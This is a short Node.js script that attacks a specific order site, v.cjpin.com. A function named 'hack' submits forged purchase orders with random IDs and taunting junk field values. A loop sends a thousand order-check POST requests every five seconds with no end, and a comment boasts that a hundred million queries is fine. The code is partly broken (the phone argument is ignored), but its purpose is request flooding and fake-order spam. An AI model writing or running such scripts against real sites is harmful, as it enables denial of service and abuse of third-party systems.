const fetch = require('node-fetch');
const GBK = require('./gbk');

const encode = (s) => GBK.URI.encodeURI(s);

const check = async (tel) => {
  const url = 'https://v.cjpin.com/app/checkorder/index.asp';
  try {
    const res = await fetch(url, {
      method: 'POST',
      body: { tel: '反正结果都一样, 我查询一亿次也没事对吧' },
    });

    console.log(res);
  } catch (error) {
    console.log(error);
  }
};

const hack = () => {
  const currentDate = new Date();
  const trueDate = currentDate.getMonth() + 1;

  let not3num = '';
  for (let i = 0; i < 3; i += 1) {
    not3num += Math.floor(Math.random() * 10);
  }

  const orderID = `no.${currentDate.getFullYear()}${trueDate}${currentDate.getDate()}${currentDate.getHours()}${currentDate.getMinutes()}${currentDate.getSeconds()}${not3num}`;

  console.log('orderID: ', orderID);
  const url = `https://v.cjpin.com/notorder.asp?${[
    ['orderid', orderID],
    ['cname', 'K001'],
    ['goodname', encode('智能扫拖机器人')],
    ['product', encode('扫地机器人188元')],
    ['mun', '1'],
    ['name', 'testtest'],
    ['mob', '13400000000'],
    ['province', encode('智能扫拖机器人')],
    ['city', encode('河北省')],
    ['area', encode('我乱写个你也能接受对吧')],
    ['address', encode('天堂')],
    ['zfbprice', '188'],
    ['ycjf', '1380'],
    ['price', '188'],
    ['pay', 'wxpay'],
    ['guest', ''],
    ['fromurl', 'https://v.cjpin.com/'],
    ['nowurl', 'https://v.cjpin.com/K001.htm'],
    ['keyword', ''],
    ['gzid', ''],
    ['submit', encode(' 立即提交订单')],
  ]
    .map((line) => `${line[0]}=${encodeURI(line[1])}`)
    .join('&')}`;

  console.log('url: ', url);

  fetch(url, {
    method: 'POST',
    headers: {
      'content-type': 'text/html',
    },
  })
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
};

const loop = (n) => {
  let x = 1;
  while (x <= n) {
    check(13000000000 + x);
    console.log(13000000000 + x);
    x += 1;
  }
};

loop(1000);
setInterval(() => loop(1000), 5000);
